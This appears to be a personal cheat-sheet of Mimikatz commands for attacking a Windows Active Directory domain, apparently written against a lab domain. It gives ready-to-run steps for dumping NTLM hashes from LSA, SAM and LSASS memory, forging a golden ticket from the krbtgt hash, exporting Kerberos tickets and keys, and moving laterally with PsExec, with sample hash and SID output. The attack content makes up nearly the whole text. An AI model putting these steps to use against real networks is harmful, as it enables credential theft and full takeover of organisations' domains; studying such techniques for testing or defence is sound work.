#Inside #Windows
Mimikatz is a very popular tool mainly used for dumping user credentials inside of active directory network.
# Dumping NTLM hashes
Firstly we need to open it.
```Powershell
./mimikatz.exe
```
Then we need to make sure we are running as admin (`Privilege '20' ok`)
```mimikatz
privilege::debug
```
And we can now use 
```mimikatz
lsadump::lsa /patch
```

# Golden Ticket Attacks
Firstly we will first dump the hash and sid of the `krbtgt` user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on a network
```mimikatz
lsadump::lsa /inject /name:krbtgt
```
From here we will need to take note of the `Domain` and the `NTLM`, which will look something like

---
Domain : CONTROLLER / **S-1-5-21-849420856-2351964222-986696166** 

RID  : 000001f6 (502)
User : krbtgt

 \* Primary
    NTLM : **5508500012cc005cf7082a9a89ebdfdf**

---
Then we can create a golden ticket, filling each field
```mimikatz
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```
And then use it to access another machine. This will open a new command prompt with elevated privileges to all machines
```mimikatz
misc::cmd
```
Now we can access other machines, our cmd will have access to all other machines on the network
```Cmd
dir \\Destkop-1\c$

PsExec.exe \\Desktop-1 cmd.exe
```

# Extracting NTLM hashes from local SAM
This method will only allow us to get hashes **from local users** on the machine. **No domain user's** hashes will be available.
```mimikatz
privilege::debug
token::elevate
lsadump::sam
```

# Extracting NTLM hashes from LSASS memory
This method will let us extract any NTLM hash **from local users** and **any domain user that has recently logged** onto the machine
```mimikatz
privilege::debug
token::elevate
sekurlsa::msv
```


# Extracting Kerberos tickets and Session Keys from LSASS memory
The process usually requires us to have **SYSYEM** privileges on the attacked machine
```mimikatz
privilege::debug
sekurlsa::tickets /export
```
Note that we need access to both the ticket and its corresponding Session Key.

# Extracting Kerberos Encryption keys from LSASS memory
We can obtain the Kerberos encryption keys from memory by using
```mimikatz
privilege::debug
sekurlsa::ekeys
```
